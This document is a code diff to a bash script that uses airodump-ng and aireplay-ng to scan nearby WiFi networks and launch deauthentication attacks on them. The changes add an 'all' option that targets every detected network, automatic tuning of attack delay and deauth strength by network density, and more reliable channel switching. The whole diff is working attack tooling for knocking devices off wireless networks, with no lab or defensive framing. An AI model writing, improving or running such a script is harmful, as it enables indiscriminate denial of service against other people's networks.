@@ -39,6 +39,7 @@ cleanup() {
 
     rm -f /tmp/aireplay_pid_*.txt
     rm -f scan_results-*.csv
+    rm -f networks.txt
     exit 0
 }
 
@@ -101,18 +102,45 @@ enable_monitor_mode() {
     # Verify monitor mode
     sleep 2
     local new_iface=$(airmon-ng | grep "$INTERFACE" | awk '{print $2}')
-    if [[ "$new_iface" == *"mon"* ]]; then
-        INTERFACE="$new_iface"
+    
+    # Check if interface name changed to *mon* OR if it is in monitor mode
+    local mode=$(iw dev "$new_iface" info 2>/dev/null | grep "type" | awk '{print $2}')
+    
+    if [[ "$new_iface" == *"mon"* ]] || [[ "$mode" == "monitor" ]]; then
+        if [ -n "$new_iface" ]; then
+             INTERFACE="$new_iface"
+        fi
         echo "[+] Monitor mode enabled on $INTERFACE"
     else
-        echo "[!] Failed to enable monitor mode"
+        echo "[!] Failed to enable monitor mode. 'airmon-ng start' failed or interface not found."
         exit 1
     fi
 }
 
-# Scan for networks
+# Auto-detect parameters based on network density
+auto_detect_params() {
+    local network_count=$(wc -l < networks.txt)
+    network_count=$((network_count - 2)) # Subtract header lines
+
+    if [ "$network_count" -gt 10 ]; then
+        echo "[!] High network density detected ($network_count networks)."
+        ATTACK_DELAY=20
+        DEAUTH_STRENGTH=10 # Lower strength to avoid congestion
+    elif [ "$network_count" -gt 5 ]; then
+        echo "[!] Medium network density detected ($network_count networks)."
+        ATTACK_DELAY=15
+        DEAUTH_STRENGTH=50
+    else
+        echo "[*] Low network density detected ($network_count networks)."
+        ATTACK_DELAY=10
+        DEAUTH_STRENGTH=100
+    fi
+    echo "[+] Auto-configured: Delay=${ATTACK_DELAY}s, Strength=${DEAUTH_STRENGTH}"
+}
+
 scan_networks() {
     echo "[*] Scanning for WiFi networks for $SCAN_TIME seconds..."
+    rm -f scan_results-*.csv
     xterm -e "airodump-ng --write scan_results --output-format csv -t WEP,WPA,OPN $INTERFACE --band abg" &
     SCAN_PID=$!
     sleep $SCAN_TIME
@@ -157,8 +185,16 @@ select_targets() {
     echo "[*] Available networks:"
     cat networks.txt
     
-    read -p "Enter target numbers (comma-separated): " TARGET_ROWS
-    IFS=',' read -ra ROWS <<< "$TARGET_ROWS"
+    read -p "Enter target numbers (comma-separated) or 'all': " TARGET_ROWS
+
+    if [[ "$TARGET_ROWS" == "all" ]]; then
+        echo "[*] Selecting ALL networks..."
+        # Get all line numbers from networks.txt (skipping header)
+        TOTAL_LINES=$(wc -l < networks.txt)
+        ROWS=($(seq 1 $((TOTAL_LINES - 2))))
+    else
+        IFS=',' read -ra ROWS <<< "$TARGET_ROWS"
+    fi
     
     for row in "${ROWS[@]}"; do
         ADJUSTED_ROW=$((row + 2)) 
@@ -194,10 +230,12 @@ deauth_attack() {
     
     echo "[+] Attacking: $essid (BSSID: $bssid) on channel $channel"
     
-    iw dev "$INTERFACE" set channel "$channel" HT20 &> /dev/null || {
+    iw dev "$INTERFACE" set channel "$channel" &> /dev/null || \
+    iwconfig "$INTERFACE" channel "$channel" &> /dev/null || {
         echo "[!] Failed to set channel $channel. Skipping..."
         return
     }
+    sleep 1 # Allow time for channel switch
     
 
     aireplay-ng --deauth "$DEAUTH_STRENGTH" -a "$bssid" "$INTERFACE" -D --ignore-negative-one &> /dev/null &
@@ -250,6 +288,7 @@ fi
 
 scan_networks
 parse_results
+auto_detect_params
 select_targets
 
 echo "[+] Starting attack loop. Press Ctrl+C to stop."
